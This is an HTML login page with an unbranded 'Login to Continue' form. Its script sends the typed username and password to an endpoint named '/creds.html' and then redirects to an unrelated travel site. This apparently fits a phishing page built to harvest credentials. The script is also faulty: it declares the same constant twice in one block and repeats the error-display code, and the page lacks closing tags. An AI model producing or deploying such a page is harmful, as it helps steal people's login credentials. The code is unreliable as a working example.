<!DOCTYPE html>
<html>
<head>
	<title>Login Page</title>
	<br><br><br>

	<center><h2 style="color:#1d44af;">Login to Continue</h2></center>
	<br><br><br><br><br><br><br>
	<style>
        
		body {
			font-family: Arial, sans-serif;
			background-color: #477bb8;
		}

		form {
			margin: auto;
			width: 300px;
			padding: 20px;
			background-color: rgb(94, 187, 148);
			box-shadow: 0 0 10px rgba(0,0,0,0.2);
			border-radius: 5px;
		}

		label {
			display: block;
			margin-bottom: 5px;
			font-weight: bold;
		}

		input[type="text"],
		input[type="password"] {
			width: 100%;
			padding: 10px;
			border-radius: 5px;
			border: none;
			box-shadow: 0 0 5px rgba(248, 244, 244, 0.2);
			margin-bottom: 20px;
			box-sizing: border-box;
		}

		button[type="submit"] {
			background-color: #4CAF50;
			color: rgb(255, 255, 255);
			padding: 10px;
			border: none;
			border-radius: 5px;
			cursor: pointer;
			width: 100%;
			margin-bottom: 10px;
			font-size: 16px;
			font-weight: bold;
			box-shadow: 0 0 5px rgba(0,0,0,0.2);
			box-sizing: border-box;
		}

		button[type="submit"]:hover {
			background-color: #2919b4;
		}

		p.error {
			color: red;
			font-weight: bold;
			margin-top: 0;
			margin-bottom: 10px;
			text-align: center;
		}
	</style>
</head>
<body>
	<form id="login-form">
		<label for="username">Username:</label>
		<input type="text" id="username" name="username" required>
		<label for="password">Password:</label>
		<input type="password" id="password" name="password" required>
		<button type="submit" id="login-button">Login</button>
	</form>

	<script>
		// Get the form element and attach an event listener to the submit event
		const form = document.getElementById('login-form');
		form.addEventListener('submit', function(event) {
			event.preventDefault(); // Prevent the form from submitting normally

			// Get the entered username and password
			const username = document.getElementById('username').value;
			const password = document.getElementById('password').value;

			// Make an AJAX request to the server to verify the user's credentials
			const xhr = new XMLHttpRequest();
			xhr.open('POST', '/creds.html', true);
			xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
			xhr.onreadystatechange = function() {
				if (xhr.readyState === 4 && xhr.status === 200) {
					const response = JSON.parse(xhr.responseText);

					if (response.success) {
						// If the credentials are correct, redirect the user to the dashboard page
						window.location.href = 'https://www.ctrip.com/';
					} else {
						// If the credentials are incorrect, display an error message
						const error = document.createElement('p');
						error.classList.add('error');
						error.textContent = 'Incorrect username or password. Please try again.';
						form.insertBefore(error, document.getElementById('login-button'));
                        					// If the credentials are incorrect, display an error message
					    const error = document.createElement('p');
                        error.classList.add('error');
                        error.textContent = 'Incorrect username or password. Please try again.';
                        form.insertBefore(error, document.getElementById('login-button'))

                    }

			    }
		    };
		    xhr.send(`username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`);
	    });
    </script>
